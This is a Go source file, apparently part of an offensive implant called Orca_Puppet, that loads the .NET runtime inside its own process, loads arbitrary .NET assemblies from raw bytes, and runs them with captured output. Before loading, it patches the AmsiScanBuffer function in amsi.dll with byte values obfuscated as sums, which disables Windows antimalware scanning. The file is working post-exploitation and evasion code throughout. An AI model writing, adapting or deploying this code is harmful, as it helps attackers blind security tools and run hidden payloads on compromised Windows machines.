//go:build amd64 && windows
// +build amd64,windows

package assemblyopt

import (
	"Orca_Puppet/pkg/evasion"
	"fmt"
	"github.com/Ne0nd0g/go-clr"
	"runtime"
	"strings"
)

// 加载 CLR 运行时版本号
func startCLR(runtime string) (results Results) {
	var err error
	// Redirect STDOUT/STDERR so it can be captured
	if !redirected {
		err = clr.RedirectStdoutStderr()
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error redirecting STDOUT/STDERR:\n%s", err)
			return
		}
	}

	// Load the CLR and an ICORRuntimeHost instance
	if runtime == "" {
		runtime = "v4"
	}
	runtimeHost, err = clr.LoadCLR(runtime)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error calling the startCLR function:\n%s", err)
		return
	}
	results.Stdout = fmt.Sprintf("\nThe %s .NET CLR runtime was successfully loaded", runtime)

	// Patch AMSI ScanBuffer
	if !patched {
		patch := []byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1}
		out, err := evasion.Patch("amsi.dll", "AmsiScanBuffer", &patch)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error patching the amsi!ScanBuffer function: %s", err)
		} else {
			results.Stdout += fmt.Sprintf("\n%s", out)
			patched = true
		}
	}
	return
}

// 加载程序集
func LoadAssembly(name string, peBytes []byte) (results Results) {
	var err error
	var a Assembly
	a.name = strings.ToLower(name)

	for _, v := range Assemblies {
		if v.name == a.name {
			results.Stderr = fmt.Sprintf(" the '%s' assembly is already loaded", a.name)
			return
		}
	}
	// Load the v4 runtime if there are not any runtimes currently loaded
	if runtimeHost == nil {
		results = startCLR("")
		if results.Stderr != "" {
			return
		}
	}

	a.methodInfo, err = clr.LoadAssembly(runtimeHost, peBytes)
	if err != nil {
		stderr := fmt.Sprintf("there was an error calling the loadAssembly function:\n%s", err)
		fmt.Println(stderr)
		return
	}
	Assemblies[a.name] = a
	results.Stdout += fmt.Sprintf("\nSuccessfully loaded %s into the default AppDomain", a.name)
	return
}

func InvokeAssembly(args []string) (results Results) {
	var isLoaded bool
	var a Assembly
	for _, v := range Assemblies {
		if v.name == strings.ToLower(args[0]) {
			isLoaded = true
			a = v
		}
	}
	if isLoaded {
		Mutex.Lock()
		results.Stdout, results.Stderr = clr.InvokeAssembly(a.methodInfo, args[1:])
		Mutex.Unlock()
		runtime.GC()
		return
	}
	results.Stderr = fmt.Sprintf("the '%s' assembly is not loaded", args[0])
	return
}
